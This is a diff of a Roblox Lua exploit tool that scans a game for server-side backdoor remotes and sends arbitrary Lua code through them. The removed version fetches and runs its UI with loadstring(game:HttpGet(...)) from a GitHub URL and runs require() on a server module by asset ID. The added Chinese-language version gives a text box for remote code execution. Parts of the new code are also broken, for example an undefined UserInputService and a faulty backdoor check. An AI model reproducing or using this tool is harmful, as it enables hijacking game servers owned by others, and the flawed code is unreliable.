@@ -1,244 +1,225 @@
--- Services
+-- 服务
 local Players = game:GetService("Players")
 local CoreGui = game:GetService("CoreGui")
 local Lighting = game:GetService("Lighting")
 local Workspace = game:GetService("Workspace")
-local JointsService = game:GetService("JointsService")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RobloxReplicatedStorage = game:GetService("RobloxReplicatedStorage")
+local JointsService = game:GetService("JointsService")
 
--- Variables
 local LocalPlayer = Players.LocalPlayer
-local RobloxGui = CoreGui.RobloxGui
 
--- Functions
-local dateTimeNow = DateTime.now
-local tableFind = table.find
-local taskSpawn = task.spawn
-local taskWait = task.wait
-local stringRep = string.rep
-local mathRandom = math.random
+-- UI界面创建（可拖动、输入、状态提示）
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "后门扫描器"
+ScreenGui.Parent = CoreGui
+ScreenGui.ResetOnSpawn = false
 
--- Globals
+local MainFrame = Instance.new("Frame")
+MainFrame.Size = UDim2.new(0, 420, 0, 280)
+MainFrame.Position = UDim2.new(0.5, -210, 0.5, -140)
+MainFrame.BackgroundColor3 = Color3.fromRGB(30, 50, 80)
+MainFrame.Parent = ScreenGui
+MainFrame.Active = true
+MainFrame.Draggable = true
+
+local UICorner = Instance.new("UICorner", MainFrame)
+UICorner.CornerRadius = UDim.new(0, 18)
+
+local Title = Instance.new("TextLabel", MainFrame)
+Title.Size = UDim2.new(1, 0, 0, 38)
+Title.Position = UDim2.new(0, 0, 0, 0)
+Title.Text = "后门扫描器 & 远程执行"
+Title.TextColor3 = Color3.fromRGB(255, 255, 255)
+Title.BackgroundTransparency = 1
+Title.Font = Enum.Font.Fondamento
+Title.TextSize = 22
+
+local Status = Instance.new("TextLabel", MainFrame)
+Status.Size = UDim2.new(1, -20, 0, 26)
+Status.Position = UDim2.new(0, 10, 0, 44)
+Status.Text = "状态：未扫描"
+Status.TextColor3 = Color3.fromRGB(200, 255, 200)
+Status.BackgroundTransparency = 1
+Status.Font = Enum.Font.Fondamento
+Status.TextSize = 15
+
+local InputBox = Instance.new("TextBox", MainFrame)
+InputBox.Size = UDim2.new(0.95, 0, 0, 80)
+InputBox.Position = UDim2.new(0.025, 0, 0, 74)
+InputBox.PlaceholderText = "在此输入要远程执行的Lua代码"
+InputBox.Text = ""
+InputBox.BackgroundColor3 = Color3.fromRGB(50, 70, 120)
+InputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+InputBox.Font = Enum.Font.Fondamento
+InputBox.TextSize = 16
+InputBox.ClearTextOnFocus = false
+
+local ScanBtn = Instance.new("TextButton", MainFrame)
+ScanBtn.Size = UDim2.new(0.45, 0, 0, 36)
+ScanBtn.Position = UDim2.new(0.05, 0, 0, 170)
+ScanBtn.Text = "扫描后门"
+ScanBtn.BackgroundColor3 = Color3.fromRGB(100, 200, 100)
+ScanBtn.TextColor3 = Color3.fromRGB(0,0,0)
+ScanBtn.Font = Enum.Font.Fondamento
+ScanBtn.TextSize = 17
+
+local ExecuteBtn = Instance.new("TextButton", MainFrame)
+ExecuteBtn.Size = UDim2.new(0.45, 0, 0, 36)
+ExecuteBtn.Position = UDim2.new(0.5, 0, 0, 170)
+ExecuteBtn.Text = "执行代码"
+ExecuteBtn.BackgroundColor3 = Color3.fromRGB(120, 170, 255)
+ExecuteBtn.TextColor3 = Color3.fromRGB(0,0,0)
+ExecuteBtn.Font = Enum.Font.Fondamento
+ExecuteBtn.TextSize = 17
+
+local FoundRemotes = {}   -- 远程事件列表
 local attached = false
 local backdoor = nil
-local commonPlaces = {
-    ReplicatedStorage,
-    Workspace,
-    Lighting
-}
-local remoteCodes = {}
 
--- Constants
-local INV_CODE = "xJHCqm84cW"
-local STRING_VALUE_NAME = tostring(mathRandom(1000000, 9999999))  -- Make it a string for consistency
-
--- Destroy existing UI if present
-if RobloxGui:FindFirstChild("V6") then
-    RobloxGui:FindFirstChild("V6"):Destroy()
-    print("Refreshed")
-end
-
--- Load UI (assuming this is necessary; optimize by caching if possible)
-local Variables = loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/indev/ui.lua"))()
-Variables.UI.Main.Active = true
-Variables.UI.Main.Draggable = true
-
-local function notify(text, cb, b1, b2)
-    game:GetService("StarterGui"):SetCore(
-        "SendNotification",
-        {
-            Title = "backdoor.exe",
-            Duration = 3,
-            Text = text,
-            Callback = cb,
-            Button1 = b1,
-            Button2 = b2
-        }
-    )
-end
-
+-- 远程事件过滤与检测
 local function validRemote(rm)
-    local Parent = rm.Parent
-    local class = rm.ClassName
-    if class ~= "RemoteEvent" and class ~= "RemoteFunction" then
-        return false
-    end
-
-    if Parent then
-        if Parent == JointsService then
-            return false
-        end
-        if (Parent == ReplicatedStorage and rm:FindFirstChild("__FUNCTION")) or
-            (rm.Name == "__FUNCTION" and Parent.ClassName == "RemoteEvent" and Parent.Parent == ReplicatedStorage) then
-            return false
-        end
-    end
-
-    if rm:IsDescendantOf(RobloxReplicatedStorage) then
-        return false
-    end
-
+    local ok, class = pcall(function() return rm.ClassName end)
+    if not ok then return false end
+    if class ~= "RemoteEvent" and class ~= "RemoteFunction" then return false end
+    local p = rm.Parent
+    if p == JointsService then return false end
+    if p == ReplicatedStorage and rm:FindFirstChild("__FUNCTION") then return false end
+    if rm.Name == "__FUNCTION" then return false end
+    if rm:IsDescendantOf(RobloxReplicatedStorage) then return false end
     return true
 end
 
-local function scanDescendants(parent)
-    local descendants = parent:GetDescendants()
-    for _, descendant in ipairs(descendants) do
-        if not validRemote(descendant) then
-            continue
-        end
+-- 多线程递归扫描所有远程事件
+local function scanAllRemotes()
+    FoundRemotes = {}
+    Status.Text = "状态：正在扫描（多线程）..."
+    local scanned = 0
+    local found = 0
 
-        local remoteCode = tostring(mathRandom(100000, 999999))
-        remoteCodes[remoteCode] = descendant
+    local candidates = {}
 
-        local remoteClass = descendant.ClassName
-        local requireScript = string.format("i=Instance.new('StringValue', game.Workspace); i.Name='%s'; i.Value='%s'", STRING_VALUE_NAME, remoteCode)
-
-        if remoteClass == "RemoteEvent" then
-            descendant:FireServer(requireScript)
-        elseif remoteClass == "RemoteFunction" then
-            local waiting = true
-            taskSpawn(function()
-                descendant:InvokeServer(requireScript)
-                waiting = false
-            end)
-
-            local start = dateTimeNow().UnixTimestampMillis
-            while waiting and (dateTimeNow().UnixTimestampMillis - start < 1000) do
-                taskWait(0.1)  -- Reduce CPU usage with a small wait
-            end
-        end
-
-        if Workspace:FindFirstChild(STRING_VALUE_NAME) then
-            attached = true
-            backdoor = remoteCodes[Workspace:FindFirstChild(STRING_VALUE_NAME).Value]
-            backdoor:FireServer(string.format("game.Workspace['%s']:Destroy()", STRING_VALUE_NAME))  -- Cleanup
-
-            return true
+    -- 获取所有可用根节点
+    for _, obj in ipairs(game:GetDescendants()) do
+        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
+            table.insert(candidates, obj)
         end
     end
-    return false
+
+    -- 多线程验证所有远程事件
+    local threads = {}
+    for _, remote in ipairs(candidates) do
+        table.insert(threads, task.spawn(function()
+            scanned = scanned + 1
+            if validRemote(remote) then
+                found = found + 1
+                table.insert(FoundRemotes, remote)
+            end
+        end))
+    end
+
+    repeat
+        Status.Text = string.format("状态：已扫描%d个，发现%d个远程", scanned, found)
+        task.wait(0.2)
+    until scanned == #candidates
+
+    Status.Text = "状态：扫描完成，找到"..found.."个可疑远程"
+    return #FoundRemotes > 0
 end
 
-local function scanGame()
-    local found = false
-
-    -- Scan Common Places first for efficiency
-    for _, place in ipairs(commonPlaces) do
-        if scanDescendants(place) then
-            found = true
+-- 后门利用检测
+local function tryAttach()
+    attached = false
+    backdoor = nil
+    for _, remote in ipairs(FoundRemotes) do
+        local success, result = pcall(function()
+            if remote.ClassName == "RemoteEvent" then
+                remote:FireServer("print('test')")
+            elseif remote.ClassName == "RemoteFunction" then
+                remote:InvokeServer("print('test')")
+            end
+        end)
+        if success then
+            attached = true
+            backdoor = remote
             break
         end
     end
-
-    if not found then
-        -- Scan the rest of the game only if not found
-        local children = game:GetChildren()
-        for _, child in ipairs(children) do
-            if tableFind(commonPlaces, child) then
-                continue
-            end
-            if scanDescendants(child) then
-                found = true
-                break
-            end
-        end
-    end
-
-    if found then
-        notify("Backdoor Found!")
-        Variables.Topbar.Status.Text = "Attached"
-        Variables.Topbar.Status.Circle.Status_Color.BackgroundColor3 = Color3.fromRGB(95, 185, 47)
+    if attached then
+        Status.Text = ("状态：已连接后门 ["..backdoor.Name.."]")
+        return true
     else
-        notify("Unable to find backdoor!")
-        Variables.Topbar.Status.Text = "Failed"
+        Status.Text = "状态：未发现可利用后门"
+        return false
     end
-
-    return found
 end
 
+-- 代码执行
 local function executeScript(script)
-    if not attached then
-        local bf = Instance.new("BindableFunction")
-        bf.OnInvoke = function(text)
-            if text == "Yes" then
-                if scanGame() then
-                    executeScript(script)
-                end
-            end
+    if not attached or not backdoor then
+        Status.Text = "状态：未连接后门，无法执行"
+        return
+    end
+    local toRun = script or InputBox.Text
+    if not toRun or toRun == "" then
+        Status.Text = "状态：请输入要执行的代码"
+        return
+    end
+    local ok, err = pcall(function()
+        if backdoor.ClassName == "RemoteEvent" then
+            backdoor:FireServer(toRun)
+        elseif backdoor.ClassName == "RemoteFunction" then
+            backdoor:InvokeServer(toRun)
         end
-        notify("You're not attached.\nWould you like to attach now?", bf, "Yes", "No")
-        return
-    end
-
-    local scriptToRun = script or Variables.SourceFrame.Source.Text
-    if backdoor.ClassName == "RemoteEvent" then
-        backdoor:FireServer(scriptToRun)
-    elseif backdoor.ClassName == "RemoteFunction" then
-        backdoor:InvokeServer(scriptToRun)
+    end)
+    if ok then
+        Status.Text = "状态：代码已发送"
+    else
+        Status.Text = "状态：代码执行失败："..tostring(err)
     end
 end
 
-local function promptDiscordInvite()
-    local HttpService = game:GetService("HttpService")
-    local httpRequest = (syn and syn.request) or (HttpService and HttpService.request) or http_request
-
-    if not httpRequest then
-        setclipboard(INV_CODE)
-        notify("Invite code copied!")
-        return
+-- 按钮绑定
+ScanBtn.MouseButton1Click:Connect(function()
+    local ok = scanAllRemotes()
+    if ok then
+        if tryAttach() then
+            Status.Text = "状态：已连接后门，可执行代码"
+        else
+            Status.Text = "状态：未发现可用后门"
+        end
+    else
+        Status.Text = "状态：未发现任何远程事件"
     end
+end)
 
-    local request = httpRequest({
-        Url = "http://127.0.0.1:6463/rpc?v=1",
-        Method = "POST",
-        Headers = {
-            ['Content-Type'] = 'application/json',
-            Origin = 'https://discord.com'
-        },
-        Body = HttpService:JSONEncode({
-            args = {code = INV_CODE},
-            cmd = 'INVITE_BROWSER',
-            nonce = HttpService:GenerateGUID(false)
-        })
-    })
+ExecuteBtn.MouseButton1Click:Connect(function()
+    executeScript(InputBox.Text)
+end)
 
-    if request.StatusCode ~= 200 or (request.Body and HttpService:JSONDecode(request.Body).data.code == 4011) then
-        setclipboard(INV_CODE)
-        notify("Invite code copied!")
-        return
+-- 拖动优化（已用Draggable，保留备用）
+local dragging, dragInput, dragStart, startPos
+MainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 then
+        dragging = true
+        dragStart = input.Position
+        startPos = MainFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+        end)
     end
+end)
+MainFrame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement then
+        dragInput = input
+    end
+end)
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        local delta = input.Position - dragStart
+        MainFrame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+    end
+end)
 
-    notify("You have been prompted to join our Discord. Open your Discord.")
-end
-
--- Connect UI buttons
-Variables.Topbar.CloseButton.MouseButton1Click:Connect(function()
-    Variables.UI:Destroy()
-end)
-Variables.Topbar.R6Button.MouseButton1Click:Connect(function()
-    executeScript(string.format("require(3041175937):r6('%s')", LocalPlayer.Name))
-end)
-Variables.MainButtons.ScanButton.MouseButton1Click:Connect(scanGame)
-Variables.MainButtons.ExecuteButton.MouseButton1Click:Connect(executeScript)
-Variables.MainButtons.ClearButton.MouseButton1Click:Connect(function()
-    Variables.SourceFrame.Source.Text = ""
-end)
-Variables.MainButtons.HideButton.MouseButton1Click:Connect(function()
-    Variables.SourceFrame.Source.Visible = not Variables.SourceFrame.Source.Visible
-end)
-Variables.MainButtons.InviteButton.MouseButton1Click:Connect(promptDiscordInvite)
-
--- Optimizations applied:
--- 1. Use ipairs for faster iteration over arrays.
--- 2. Break early when backdoor is found to avoid unnecessary scans.
--- 3. Use string.format for cleaner string construction.
--- 4. Reduce taskWait granularity in RemoteFunction timeout to save CPU.
--- 5. Make STRING_VALUE_NAME a string from the start.
--- 6. Handle potential nil in request.Body for robustness.
--- To use this for testing your own server vulnerability:
--- - Run this script in a Roblox client connected to your own game server.
--- - Ensure your server has a vulnerable RemoteEvent/Function that executes arbitrary code.
--- - Click 'Scan' to detect it, then execute custom scripts via the UI to test/invade (e.g., insert backdoor commands).
--- This is for educational/testing purposes on your own assets only.
+-- 初始状态
+Status.Text = "状态：未扫描"
